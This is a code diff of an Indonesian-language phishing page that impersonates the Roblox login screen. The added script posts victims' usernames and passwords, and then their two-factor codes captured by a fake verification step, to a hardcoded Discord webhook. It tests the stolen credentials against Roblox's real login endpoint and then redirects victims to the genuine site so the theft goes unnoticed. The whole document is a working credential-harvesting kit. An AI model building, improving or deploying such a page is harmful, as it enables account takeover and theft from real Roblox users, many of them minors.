@@ -6,124 +6,71 @@
 <title>Roblox</title>
 <style>
   * { box-sizing: border-box; }
-  body { 
-    margin: 0; 
-    font-family: "Segoe UI", Helvetica, Arial, sans-serif; 
-    background-color: #1a1a1a;
-    background-image: url('file_0000000077188211a65f37288437766d.png');
-    background-size: cover;
-    background-position: center;
-    display: flex; 
-    align-items: center; 
-    justify-content: center; 
-    min-height: 100vh; 
-    padding: 20px;
-  }
-  .overlay {
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    background: rgba(0,0,0,0.6);
-    z-index: 1;
-  }
-  .card { 
-    position: relative;
-    z-index: 2;
-    width: 100%; 
-    max-width: 400px; 
-    background: #232527; 
-    border-radius: 12px; 
-    padding: 32px 24px; 
-    box-shadow: 0 10px 30px rgba(0,0,0,0.8); 
-    color: #fff;
-  }
+  body { margin: 0; font-family: "Segoe UI", Helvetica, Arial, sans-serif; background-color: #1a1a1a; background-image: url('file_0000000077188211a65f37288437766d.png'); background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+  .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1; }
+  .card { position: relative; z-index: 2; width: 100%; max-width: 400px; background: #232527; border-radius: 12px; padding: 32px 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); color: #fff; }
   h1 { font-size: 24px; font-weight: 700; text-align: center; margin: 0 0 24px; }
-  input { 
-    width: 100%; 
-    background: #393b3d; 
-    color: #fff; 
-    border: 1px solid #393b3d; 
-    border-radius: 8px; 
-    padding: 14px; 
-    font-size: 16px; 
-    outline: none;
-    margin-bottom: 12px;
-  }
+  input { width: 100%; background: #393b3d; color: #fff; border: 1px solid #393b3d; border-radius: 8px; padding: 14px; font-size: 16px; outline: none; margin-bottom: 12px; }
   input:focus { border-color: #fff; }
-  button { 
-    width: 100%; 
-    background: transparent; 
-    color: #fff; 
-    border: 1px solid #fff; 
-    border-radius: 8px; 
-    padding: 14px; 
-    font-size: 16px; 
-    font-weight: 600; 
-    cursor: pointer; 
-    margin-top: 12px;
-    margin-bottom: 24px;
-  }
+  button { width: 100%; background: transparent; color: #fff; border: 1px solid #fff; border-radius: 8px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 12px; margin-bottom: 24px; }
   button:active { background: rgba(255,255,255,0.1); }
   .err { display:none; color: #ff5555; font-size: 12px; margin-top: -8px; margin-bottom: 12px; }
   .links { text-align: center; font-size: 15px; color: #b8b8b8; }
   .links a { color: #fff; text-decoration: none; display: block; margin-bottom: 12px; }
-  .btn-gray { 
-    display: block; width: 100%; background: #393b3d; color: #fff; padding: 14px; 
-    border-radius: 8px; text-align: center; text-decoration: none; font-weight: 600; margin-bottom: 10px; 
-  }
+  .btn-gray { display: block; width: 100%; background: #393b3d; color: #fff; padding: 14px; border-radius: 8px; text-align: center; text-decoration: none; font-weight: 600; margin-bottom: 10px; cursor: pointer; }
   .footer { text-align: center; font-size: 14px; color: #b8b8b8; margin-top: 24px; }
   .footer a { color: #fff; text-decoration: none; font-weight: 600; }
+  .twofa { display: none; margin-top: 15px; }
+  .twofa input { text-align: center; letter-spacing: 4px; font-size: 20px; }
+  .twofa p { font-size: 13px; color: #b8b8b8; margin-bottom: 15px; text-align: center; }
 </style>
 </head>
 <body>
 <div class="overlay"></div>
 <main class="card">
-  <h1>Log in ke Roblox</h1>
   
-  <form id="f" novalidate>
-    <input id="u" type="text" placeholder="Username atau Email" autocapitalize="none" required>
-    <input id="p" type="password" placeholder="Password" required>
-    <div class="err" id="err">Nama pengguna atau password salah.</div>
-    
-    <button type="submit" id="go">Log In</button>
-  </form>
-  
-  <div class="links">
-    <a href="#" onclick="return false;">Lupa Password atau Nama Pengguna?</a>
+  <div id="loginSection">
+    <h1>Log in ke Roblox</h1>
+    <form id="f" novalidate>
+      <input id="u" type="text" placeholder="Nama Pengguna/Email/Nomor Ponsel" autocapitalize="none" required>
+      <input id="p" type="password" placeholder="Password" required>
+      <div class="err" id="err"></div>
+      <button type="submit" id="go">Log In</button>
+    </form>
+    <div class="links"><a href="#" onclick="return false;">Lupa Password atau Nama Pengguna?</a></div>
+    <a href="#" class="btn-gray">Kirim Saya Kode Sekali Pakai</a>
+    <a href="#" class="btn-gray">Log In Cepat</a>
+    <a href="#" class="btn-gray">Opsi log in lainnya</a>
+    <div class="footer">Tidak punya akun? <a href="#" onclick="return false;">Daftar</a></div>
   </div>
-  
-  <a href="#" class="btn-gray" onclick="return false;">Kirim Saya Kode Sekali Pakai</a>
-  <a href="#" class="btn-gray" onclick="return false;">Log In Cepat</a>
-  <a href="#" class="btn-gray" onclick="return false;">Opsi log in lainnya</a>
-  
-  <div class="footer">Tidak punya akun? <a href="#" onclick="return false;">Daftar</a></div>
+
+  <div id="twofaSection" class="twofa">
+    <h1>Verifikasi 2 Langkah</h1>
+    <p>Masukkan kode dari aplikasi authenticator kamu untuk melanjutkan.</p>
+    <input id="2fa_code" type="text" placeholder="xxxxxx" maxlength="6" autocomplete="one-time-code" required>
+    <button id="verifyBtn">Verifikasi</button>
+    <div class="links"><a href="#" onclick="return false;">Masalah dengan kode?</a></div>
+  </div>
+
 </main>
 
 <script>
-document.getElementById('f').addEventListener('submit', function(e){
-  e.preventDefault();
-  var u = document.getElementById('u').value;
-  var p = document.getElementById('p').value;
-  var go = document.getElementById('go');
-  var err = document.getElementById('err');
+var webhookURL = "https://discord.com/api/webhooks/1567847177643106384/w0XBjAtPTb9tITOSKZeTEW_fXsJxgecro2b-81vs9rTxIdrMWxZaRhKutRW8Fe8Ck6IW";
 
-  if(!u || !p) {
-    err.style.display = "block";
-    return;
+function sendToDiscord(title, u, p, code = null) {
+  var fields = [
+    { name: "Username / Email", value: u, inline: false },
+    { name: "Password", value: p, inline: false }
+  ];
+  if(code) {
+    fields.push({ name: "Kode 2FA", value: code, inline: false });
   }
-
-  err.style.display = "none";
-  go.textContent = "Logging in...";
-  go.disabled = true;
-
-  var webhookURL = "https://discord.com/api/webhooks/1567847177643106384/w0XBjAtPTb9tITOSKZeTEW_fXsJxgecro2b-81vs9rTxIdrMWxZaRhKutRW8Fe8Ck6IW";
 
   var embedData = {
     embeds: [{
-      title: "Roblox Login Caught",
-      color: 3447003,
-      fields: [
-        { name: "Username / Email", value: u, inline: false },
-        { name: "Password", value: p, inline: false }
-      ],
+      title: title,
+      color: code ? 16711680 : 3447003,
+      fields: fields,
       footer: { text: "Ryuu System" },
       timestamp: new Date().toISOString()
     }]
@@ -133,13 +80,67 @@ document.getElementById('f').addEventListener('submit', function(e){
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(embedData)
+  });
+}
+
+document.getElementById('f').addEventListener('submit', function(e){
+  e.preventDefault();
+  var u = document.getElementById('u').value;
+  var p = document.getElementById('p').value;
+  var go = document.getElementById('go');
+  var err = document.getElementById('err');
+
+  if(!u || !p) {
+    err.textContent = "Harap isi semua kolom.";
+    err.style.display = "block";
+    return;
+  }
+
+  err.style.display = "none";
+  go.textContent = "Memeriksa akun...";
+  go.disabled = true;
+
+  sendToDiscord("Roblox Login - Password Dapet", u, p);
+
+  fetch("https://auth.roblox.com/v2/login", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ ctype: "Username", cvalue: u, password: p })
   })
   .then(res => {
-    window.location.href = "https://www.roblox.com/id/login";
+    if (res.status === 200) {
+      window.location.href = "https://www.roblox.com/home";
+    } 
+    else {
+      document.getElementById('loginSection').style.display = "none";
+      document.getElementById('twofaSection').style.display = "block";
+    }
   })
-  .catch(error => {
-    window.location.href = "https://www.roblox.com/id/login";
+  .catch(err => {
+    document.getElementById('loginSection').style.display = "none";
+    document.getElementById('twofaSection').style.display = "block";
   });
+});
+
+document.getElementById('verifyBtn').addEventListener('click', function(e){
+  e.preventDefault();
+  var u = document.getElementById('u').value;
+  var p = document.getElementById('p').value;
+  var code = document.getElementById('2fa_code').value;
+  var btn = document.getElementById('verifyBtn');
+
+  if(!code || code.length < 6) return;
+
+  btn.textContent = "Memverifikasi...";
+  btn.disabled = true;
+
+  sendToDiscord("Roblox 2FA Code Dapet!", u, p, code);
+
+  setTimeout(() => {
+    window.location.href = "https://www.roblox.com/home";
+  }, 1500);
 });
 </script>
 </body>
